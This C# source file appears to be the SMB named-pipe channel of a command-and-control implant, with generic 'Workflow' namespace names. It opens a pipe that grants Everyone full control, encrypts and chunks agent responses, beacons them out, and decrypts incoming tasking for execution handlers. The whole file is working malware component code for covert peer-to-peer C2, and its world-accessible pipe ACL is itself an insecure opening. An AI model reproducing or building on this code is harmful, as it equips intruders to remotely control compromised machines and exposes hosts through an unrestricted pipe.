using Workflow.Contracts;
using Workflow.Utilities;
using System.Text.Json;
using Workflow.Models;
using Workflow.Channels.Smb;
using System.IO.Pipes;
using System.Security.AccessControl;
using System.Security.Principal;
using H.Pipes;
using H.Pipes.AccessControl;
using H.Pipes.Args;

namespace Workflow.Channels
{
    public class SmbProfile : IChannel, IAsyncDisposable
    {
        private IServiceConfig agentConfig { get; set; }
        private ISecurityProvider crypt { get; set; }
        private IDataBroker messageManager { get; set; }
        private ILogger logger { get; set; }
        private string pipeName;
        private int chunkSize;
        private int connectionTimeoutMs;
        private int checkinTimeoutMs;
        private ChunkedMessageAssembler assembler = new();
        private PipeServer<SmbMessage> serverPipe { get; set; }
        private TaskCompletionSource<CheckinResponse>
            checkinTcs = new();
        private ManualResetEventSlim clientConnected =
            new ManualResetEventSlim(false);
        public event EventHandler<TaskingReceivedArgs>?
            SetTaskingReceived;

        private bool checkedin = false;
        private int currentAttempt = 0;
        private int maxAttempts = 10;
        private bool disposed = false;
        private CancellationTokenSource cancellationTokenSource
            { get; set; } = new CancellationTokenSource();

        public SmbProfile(
            IServiceConfig config,
            ISecurityProvider crypto,
            ILogger logger,
            IDataBroker messageManager)
        {
            this.agentConfig = config;
            this.crypt = crypto;
            this.logger = logger;
            this.messageManager = messageManager;

            var opts = JsonSerializer.Deserialize(
                ChannelConfig.Decode(),
                SmbChannelOptionsJsonContext.Default
                    .SmbChannelOptions);

            this.pipeName = opts.PipeName;
            this.chunkSize = opts.ChunkSize;
            this.connectionTimeoutMs =
                opts.ConnectionTimeoutSeconds * 1000;
            this.checkinTimeoutMs =
                opts.CheckinTimeoutSeconds * 1000;
            DebugLog.Log($"SMB pipe name: {this.pipeName}");

            this.serverPipe =
                new PipeServer<SmbMessage>(this.pipeName);
            if (OperatingSystem.IsWindows())
            {
#pragma warning disable CA1416
                var pipeSec = new PipeSecurity();
                pipeSec.AddAccessRule(
                    new PipeAccessRule(
                        new SecurityIdentifier(
                            WellKnownSidType.WorldSid, null),
                        PipeAccessRights.FullControl,
                        AccessControlType.Allow));
                this.serverPipe.SetPipeSecurity(pipeSec);
#pragma warning restore CA1416
            }

            this.serverPipe.ClientConnected +=
                async (o, args) => await OnClientConnection();
            this.serverPipe.ClientDisconnected +=
                async (o, args) => await OnClientDisconnect();
            this.serverPipe.MessageReceived +=
                async (sender, args) =>
                    await OnMessageReceive(args);
            this.serverPipe.StartAsync(
                this.cancellationTokenSource.Token);
            DebugLog.Log("SMB server pipe started");
        }

        public async Task<CheckinResponse> Checkin(
            Checkin checkin)
        {
            DebugLog.Log("SMB sending checkin");
            this.checkinTcs =
                new TaskCompletionSource<CheckinResponse>();
            await this.Send(
                JsonSerializer.Serialize(
                    checkin,
                    CheckinJsonContext.Default.Checkin));

            DebugLog.Log("SMB waiting for checkin response");
            using var cts = new CancellationTokenSource(
                this.checkinTimeoutMs);
            try
            {
                var result = await checkinTcs.Task
                    .WaitAsync(cts.Token);
                this.checkedin = true;
                DebugLog.Log("SMB checkin complete");
                return result;
            }
            catch (OperationCanceledException)
            {
                DebugLog.Log("SMB checkin timed out");
                throw new TimeoutException(
                    $"SMB checkin timed out after "
                    + $"{this.checkinTimeoutMs}ms");
            }
        }

        public async Task StartBeacon()
        {
            while (!cancellationTokenSource.Token
                .IsCancellationRequested)
            {
                if (!this.messageManager.HasResponses())
                {
                    try
                    {
                        await Task.Delay(
                            500,
                            cancellationTokenSource.Token);
                    }
                    catch (OperationCanceledException)
                    {
                        break;
                    }
                    continue;
                }

                try
                {
                    DebugLog.Log(
                        "SMB beacon sending responses");
                    await this.Send(
                        messageManager
                            .GetAgentResponseString());
                    this.currentAttempt = 0;
                }
                catch (Exception e)
                {
                    this.currentAttempt++;
                    DebugLog.Log(
                        $"SMB beacon send failed: "
                        + $"{e.Message}, attempt "
                        + $"{this.currentAttempt}/"
                        + $"{this.maxAttempts}");
                }

                if (this.currentAttempt >= this.maxAttempts)
                {
                    DebugLog.Log(
                        "SMB beacon max attempts reached");
                    this.cancellationTokenSource.Cancel();
                }
            }
        }

        internal async Task Send(string json)
        {
            if (!clientConnected.IsSet)
            {
                DebugLog.Log(
                    "SMB Send waiting for client");
                if (!clientConnected.Wait(
                        this.connectionTimeoutMs))
                {
                    throw new TimeoutException(
                        $"SMB connection timed out after "
                        + $"{this.connectionTimeoutMs}ms");
                }
            }

            DebugLog.Log(
                $"SMB Send ({json.Length} chars)");
            json = this.crypt.Encrypt(json);
            List<string> parts =
                json.SplitByLength(this.chunkSize).ToList();
            DebugLog.Log(
                $"SMB Send chunking into {parts.Count} parts");

            string messageGuid = Guid.NewGuid().ToString();
            for (int i = 0; i < parts.Count; i++)
            {
                SmbMessage sm = new SmbMessage()
                {
                    guid = messageGuid,
                    final = (i == parts.Count - 1),
                    message_type = SmbMessageType.Chunked,
                    agent_guid = agentConfig.uuid,
                    delegate_message = parts[i],
                    sequence = i,
                };
                await this.serverPipe.WriteAsync(sm);
            }
        }

        public bool StopBeacon()
        {
            this.cancellationTokenSource.Cancel();
            return true;
        }

        private async Task SendMessageComplete()
        {
            var sm = new SmbMessage
            {
                guid = Guid.NewGuid().ToString(),
                message_type = SmbMessageType.MessageComplete,
                final = true,
                delegate_message = string.Empty,
                agent_guid = agentConfig.uuid,
                sequence = 0,
            };
            await this.serverPipe.WriteAsync(sm);
        }

        private async Task SendError(string errorMessage)
        {
            var sm = new SmbMessage
            {
                guid = Guid.NewGuid().ToString(),
                message_type = SmbMessageType.Error,
                final = true,
                delegate_message = errorMessage,
                agent_guid = agentConfig.uuid,
                sequence = 0,
            };
            await this.serverPipe.WriteAsync(sm);
        }

        private async Task OnMessageReceive(
            ConnectionMessageEventArgs<SmbMessage> args)
        {
            try
            {
                DebugLog.Log(
                    $"SMB message received, type: "
                    + args.Message.message_type);

                switch (args.Message.message_type)
                {
                    case SmbMessageType.ConnectionReady:
                    case SmbMessageType.MessageComplete:
                    case SmbMessageType.Error:
                        return;

                    case SmbMessageType.Chunked:
                        break;

                    default:
                        return;
                }

                var result = assembler.AddChunk(
                    args.Message.guid,
                    args.Message.sequence,
                    args.Message.delegate_message,
                    args.Message.final,
                    out string? fullMessage);

                DebugLog.Log(
                    $"SMB chunk result: {result}, "
                    + $"guid: {args.Message.guid}, "
                    + $"seq: {args.Message.sequence}");

                if (result
                    == ChunkedMessageAssembler.Result
                        .OutOfOrder)
                {
                    DebugLog.Log(
                        "SMB chunk out of order, discarding");
                    await this.SendError(
                        "Out of order chunk");
                    return;
                }

                if (result
                    == ChunkedMessageAssembler.Result.Complete
                    && fullMessage != null)
                {
                    await this.OnMessageReceiveComplete(
                        fullMessage);
                    await this.SendMessageComplete();
                }
            }
            catch (Exception e)
            {
                DebugLog.Log(
                    $"SMB OnMessageReceive error: "
                    + e.Message);
            }
        }

        private async Task OnClientConnection()
        {
            DebugLog.Log("SMB client connected");
            clientConnected.Set();
            var sm = new SmbMessage
            {
                guid = Guid.NewGuid().ToString(),
                message_type = SmbMessageType.ConnectionReady,
                final = true,
                delegate_message = string.Empty,
                agent_guid = this.agentConfig.uuid,
                sequence = 0,
            };
            await this.serverPipe.WriteAsync(sm);
        }

        private Task OnClientDisconnect()
        {
            DebugLog.Log("SMB client disconnected");
            clientConnected.Reset();
            assembler.Clear();
            return Task.CompletedTask;
        }

        private async Task OnMessageReceiveComplete(
            string message)
        {
            if (!checkedin)
            {
                var cir = JsonSerializer.Deserialize(
                    this.crypt.Decrypt(message),
                    CheckinResponseJsonContext.Default
                        .CheckinResponse);
                checkinTcs.TrySetResult(cir);
                return;
            }

            GetTaskingResponse gtr =
                JsonSerializer.Deserialize(
                    this.crypt.Decrypt(message),
                    GetTaskingResponseJsonContext.Default
                        .GetTaskingResponse);

            if (gtr == null)
            {
                return;
            }

            TaskingReceivedArgs tra =
                new TaskingReceivedArgs(gtr);
            SetTaskingReceived?.Invoke(this, tra);
        }

        public async ValueTask DisposeAsync()
        {
            if (disposed) return;
            disposed = true;

            cancellationTokenSource.Cancel();
            cancellationTokenSource.Dispose();
            clientConnected.Dispose();
            if (serverPipe != null)
            {
                await serverPipe.DisposeAsync();
            }
        }
    }
}
